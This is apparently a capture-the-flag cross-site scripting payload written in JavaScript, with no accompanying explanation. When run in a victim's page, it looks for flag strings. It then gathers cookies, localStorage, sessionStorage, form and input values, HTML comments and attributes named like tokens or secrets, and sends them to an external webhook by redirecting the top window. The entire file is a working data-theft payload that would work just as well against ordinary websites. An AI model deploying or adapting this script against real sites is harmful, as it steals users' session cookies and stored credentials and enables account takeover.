(() => {
  const WEBHOOK = 'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116';

  const send = (obj) => {
    const u = new URL(WEBHOOK);
    for (const [k, v] of Object.entries(obj)) {
      u.searchParams.set(k, String(v ?? ''));
    }
    top.location = u.toString();
  };

  const clean = (s, n = 1200) =>
    String(s || '').replace(/\s+/g, ' ').trim().slice(0, n);

  const findFlag = (text) => {
    const pats = [
      /flag\{[^}]+\}/i,
      /ctf\{[^}]+\}/i,
      /hackcon[a-z_]*\{[^}]+\}/i,
      /hc[a-z_]*\{[^}]+\}/i
    ];
    for (const re of pats) {
      const m = String(text || '').match(re);
      if (m) return m[0];
    }
    return null;
  };

  try {
    const immediate =
      findFlag(document.title) ||
      findFlag(document.body?.innerText) ||
      findFlag(document.documentElement?.outerHTML);

    if (immediate) {
      send({
        type: 'flag',
        href: location.href,
        path: location.pathname,
        title: document.title || '',
        value: immediate
      });
      return;
    }
  } catch {}

  const out = {};

  try { out.type = 'map'; } catch {}
  try { out.href = location.href; } catch {}
  try { out.origin = location.origin; } catch {}
  try { out.path = location.pathname; } catch {}
  try { out.search = location.search; } catch {}
  try { out.hash = location.hash; } catch {}
  try { out.title = document.title || ''; } catch {}
  try { out.cookie = document.cookie || ''; } catch {}

  try {
    out.headings = [...document.querySelectorAll('h1,h2,h3,h4')]
      .map(x => clean(x.innerText, 120))
      .filter(Boolean)
      .slice(0, 12)
      .join(' | ');
  } catch {}

  try {
    out.links = [...document.querySelectorAll('a[href]')]
      .map(a => `${clean(a.innerText, 80)}=>${a.getAttribute('href')}`)
      .slice(0, 20)
      .join(' | ');
  } catch {}

  try {
    out.forms = [...document.forms]
      .map((f, i) => {
        const fields = [...f.querySelectorAll('input,textarea,select,button')]
          .map(el => `${el.name || '(noname)'}:${el.type || el.tagName.toLowerCase()}`)
          .slice(0, 20)
          .join(',');
        return `f${i}[${(f.method || 'GET').toUpperCase()} ${f.getAttribute('action') || location.pathname}] ${fields}`;
      })
      .slice(0, 10)
      .join(' | ');
  } catch {}

  try {
    out.tables = [...document.querySelectorAll('table')]
      .map((t, i) => {
        const txt = clean(t.innerText, 500);
        return `table${i}:${txt}`;
      })
      .slice(0, 6)
      .join(' | ');
  } catch {}

  try {
    out.inputs = [...document.querySelectorAll('input,textarea,select')]
      .map(el => `${el.tagName.toLowerCase()} name=${el.name || ''} id=${el.id || ''} type=${el.type || ''} value=${clean(el.value || el.getAttribute('value') || '', 80)}`)
      .slice(0, 30)
      .join(' | ');
  } catch {}

  try {
    out.meta = [...document.querySelectorAll('meta')]
      .map(m => clean(m.outerHTML, 200))
      .slice(0, 20)
      .join(' | ');
  } catch {}

  try {
    out.comments = [];
    const walker = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT);
    let node;
    while ((node = walker.nextNode())) {
      out.comments.push(clean(node.nodeValue, 200));
      if (out.comments.length >= 15) break;
    }
    out.comments = out.comments.join(' | ');
  } catch {}

  try {
    out.scripts = [...document.scripts]
      .map((s, i) => {
        const src = s.src ? `src=${s.src}` : `inline=${clean(s.textContent, 200)}`;
        return `script${i}:${src}`;
      })
      .slice(0, 20)
      .join(' | ');
  } catch {}

  try {
    out.ids = [...document.querySelectorAll('[id]')]
      .map(el => el.id)
      .filter(Boolean)
      .slice(0, 50)
      .join(',');
  } catch {}

  try {
    out.classes = [...document.querySelectorAll('[class]')]
      .map(el => el.className)
      .filter(Boolean)
      .map(x => clean(x, 80))
      .slice(0, 50)
      .join(',');
  } catch {}

  try {
    const rows = [...document.querySelectorAll('tr')]
      .map(tr => clean(tr.innerText, 250))
      .filter(Boolean)
      .slice(0, 20);
    out.rows = rows.join(' | ');
  } catch {}

  try {
    const suspicious = [...document.querySelectorAll('*')]
      .flatMap(el =>
        el.getAttributeNames()
          .filter(a => /flag|token|secret|key|admin|user|role|data/i.test(a))
          .map(a => `${el.tagName.toLowerCase()}.${a}=${clean(el.getAttribute(a), 120)}`)
      )
      .slice(0, 30);
    out.attrs = suspicious.join(' | ');
  } catch {}

  try {
    const ls = [];
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      ls.push(`${k}=${clean(localStorage.getItem(k), 120)}`);
      if (ls.length >= 20) break;
    }
    out.localStorage = ls.join(' | ');
  } catch {}

  try {
    const ss = [];
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      ss.push(`${k}=${clean(sessionStorage.getItem(k), 120)}`);
      if (ss.length >= 20) break;
    }
    out.sessionStorage = ss.join(' | ');
  } catch {}

  try {
    out.body = clean(document.body?.innerText, 2500);
  } catch {}

  try {
    const html = document.documentElement?.outerHTML || '';
    const hit = findFlag(html);
    if (hit) {
      send({
        type: 'flag',
        href: location.href,
        path: location.pathname,
        title: document.title || '',
        where: 'html',
        value: hit
      });
      return;
    }
  } catch {}

  send(out);
})();
